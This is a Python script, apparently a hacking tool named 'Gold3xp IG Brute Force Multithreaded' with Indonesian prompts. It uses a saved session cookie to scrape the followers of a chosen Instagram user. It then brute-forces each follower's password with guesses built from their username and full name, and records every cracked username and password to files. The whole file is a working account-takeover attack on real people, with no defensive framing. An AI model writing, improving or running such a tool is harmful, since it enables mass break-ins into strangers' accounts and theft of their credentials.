import os, json, time, random
from concurrent.futures import ThreadPoolExecutor
from instagrapi import Client
from colorama import Fore, init
from utils.brute_force import threaded_login_attempt
from utils.tools import generate_passwords

init(autoreset=True)

DATA_FOLDER = "Data/akun1"
COOKIE_FILE = os.path.join(DATA_FOLDER, "cookie.txt")
USER_FILE = os.path.join(DATA_FOLDER, "user.txt")
HASH_DB = "hash_db.json"

def load_cookie():
    if not os.path.exists(COOKIE_FILE) or not os.path.exists(USER_FILE):
        print(Fore.RED + "[!] cookie.txt atau user.txt tidak ditemukan.")
        exit()

    with open(USER_FILE, "r") as f:
        username = f.read().strip()

    with open(COOKIE_FILE, "r") as f:
        cookie_raw = f.read().strip()

    cookies = {}
    for part in cookie_raw.split(";"):
        if "=" in part:
            k, v = part.strip().split("=", 1)
            cookies[k] = v
    return username, cookies

def load_hash_db():
    return json.load(open(HASH_DB)) if os.path.exists(HASH_DB) else {}

def update_hash_db(db):
    with open(HASH_DB, "w") as f:
        json.dump(db, f, indent=2)

def save_result(username, password):
    with open("hasil_sukses.txt", "a") as f:
        f.write(f"{username} | {password}\n")

def scrape_followers(cl, target_user):
    try:
        user_id = cl.user_id_from_username(target_user)
        followers = cl.user_followers(user_id)
        return {user.username: user.full_name for user in followers.values()}
    except Exception as e:
        print(Fore.RED + f"[!] Gagal mengambil followers: {e}")
        return {}

def main():
    os.system("clear")
    print(Fore.CYAN + "== Gold3xp IG Brute Force Multithreaded ==")
    target_user = input(Fore.YELLOW + "Masukkan username target (tanpa @): ").strip().lstrip("@")

    login_user, cookies = load_cookie()
    cl = Client()

    try:
        cl.login_by_sessionid(cookies.get("sessionid"))
        print(Fore.GREEN + f"[✓] Login berhasil sebagai @{login_user}")
    except Exception as e:
        print(Fore.RED + f"[✗] Gagal login: {e}")
        return

    print(Fore.CYAN + f"⏳ Mengambil followers dari @{target_user}...")
    followers = scrape_followers(cl, target_user)
    print(Fore.GREEN + f"[✓] Ditemukan {len(followers)} followers")

    hash_db = load_hash_db()
    max_threads = 10

    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for username, full_name in followers.items():
            password_list = generate_passwords(username, full_name)
            futures.append(executor.submit(threaded_login_attempt, username, password_list, hash_db))

        for future in futures:
            result = future.result()
            if result:
                username, password = result
                save_result(username, password)
                hash_db[username] = password
                update_hash_db(hash_db)

if __name__ == "__main__":
    main()
